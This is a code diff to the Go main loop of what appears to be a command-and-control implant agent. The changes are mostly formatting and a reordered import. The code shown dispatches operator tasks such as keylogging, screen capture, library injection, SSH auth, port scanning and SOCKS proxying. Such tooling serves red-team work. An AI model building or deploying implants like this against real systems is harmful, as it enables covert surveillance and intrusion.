@@ -21,6 +21,7 @@ import (
 	"keys"
 	"kill"
 	"libinject"
+	"list_entitlements"
 	"listtasks"
 	"ls"
 	"mkdir"
@@ -42,7 +43,6 @@ import (
 	"triagedirectory"
 	"unsetenv"
 	"xpc"
-	"list_entitlements"
 )
 
 const (
@@ -156,43 +156,43 @@ func main() {
 	profile.SetApfellID(checkIn.ID)
 
 	tasktypes := map[string]int{
-		"exit":            EXIT_CODE,
-		"shell":           1,
-		"screencapture":   2,
-		"keylog":          3,
-		"download":        4,
-		"upload":          5,
-		"libinject":       6,
-		"ps":              8,
-		"sleep":           9,
-		"cat":             10,
-		"cd":              11,
-		"ls":              12,
-		"python":          13,
-		"jxa":             14,
-		"keys":            15,
-		"triagedirectory": 16,
-		"sshauth":         17,
-		"portscan":        18,
-		"jobs":            21,
-		"jobkill":         22,
-		"cp":              23,
-		"drives":          24,
-		"getuser":         25,
-		"mkdir":           26,
-		"mv":              27,
-		"pwd":             28,
-		"rm":              29,
-		"getenv":          30,
-		"setenv":          31,
-		"unsetenv":        32,
-		"kill":            33,
-		"curl":            34,
-		"xpc":             35,
-		"socks":           36,
-		"listtasks":       37,
+		"exit":              EXIT_CODE,
+		"shell":             1,
+		"screencapture":     2,
+		"keylog":            3,
+		"download":          4,
+		"upload":            5,
+		"libinject":         6,
+		"ps":                8,
+		"sleep":             9,
+		"cat":               10,
+		"cd":                11,
+		"ls":                12,
+		"python":            13,
+		"jxa":               14,
+		"keys":              15,
+		"triagedirectory":   16,
+		"sshauth":           17,
+		"portscan":          18,
+		"jobs":              21,
+		"jobkill":           22,
+		"cp":                23,
+		"drives":            24,
+		"getuser":           25,
+		"mkdir":             26,
+		"mv":                27,
+		"pwd":               28,
+		"rm":                29,
+		"getenv":            30,
+		"setenv":            31,
+		"unsetenv":          32,
+		"kill":              33,
+		"curl":              34,
+		"xpc":               35,
+		"socks":             36,
+		"listtasks":         37,
 		"list_entitlements": 38,
-		"none":            NONE_CODE,
+		"none":              NONE_CODE,
 	}
 
 	// Map used to handle go routines that are waiting for a response from apfell to continue
@@ -227,7 +227,7 @@ func main() {
 				fromMythicSocksChannel <- task.Socks[j]
 			}
 			for j := 0; j < len(task.Tasks); j++ {
-				if tasktypes[task.Tasks[j].Command] == 3 || tasktypes[task.Tasks[j].Command] == 16 || tasktypes[task.Tasks[j].Command] == 18{
+				if tasktypes[task.Tasks[j].Command] == 3 || tasktypes[task.Tasks[j].Command] == 16 || tasktypes[task.Tasks[j].Command] == 18 {
 					// log.Println("Making a job for", task.Command)
 					job := &structs.Job{
 						KillChannel: make(chan int),
@@ -310,8 +310,8 @@ func main() {
 				case 9:
 					// Sleep
 					type Args struct {
-						Interval  int `json:"interval"`
-						Jitter int `json:"jitter"`
+						Interval int `json:"interval"`
+						Jitter   int `json:"jitter"`
 					}
 
 					args := Args{}
@@ -331,14 +331,14 @@ func main() {
 						break
 					}
 					output := ""
-                    if args.Interval >= 0{
-                        profile.SetSleepInterval(args.Interval)
-                        output += "Sleep interval updated\n"
-                    }
-                    if args.Jitter >= 0{
-                        profile.SetSleepJitter(args.Jitter)
-                        output += "Jitter interval updated\n"
-                    }
+					if args.Interval >= 0 {
+						profile.SetSleepInterval(args.Interval)
+						output += "Sleep interval updated\n"
+					}
+					if args.Jitter >= 0 {
+						profile.SetSleepJitter(args.Jitter)
+						output += "Jitter interval updated\n"
+					}
 					resp := structs.Response{}
 					resp.UserOutput = output
 					resp.Completed = true
@@ -590,8 +590,8 @@ func main() {
 					go listtasks.Run(task.Tasks[j])
 					break
 				case 38:
-				    go list_entitlements.Run(task.Tasks[j])
-				    break
+					go list_entitlements.Run(task.Tasks[j])
+					break
 				case NONE_CODE:
 					// No tasks, do nothing
 					break
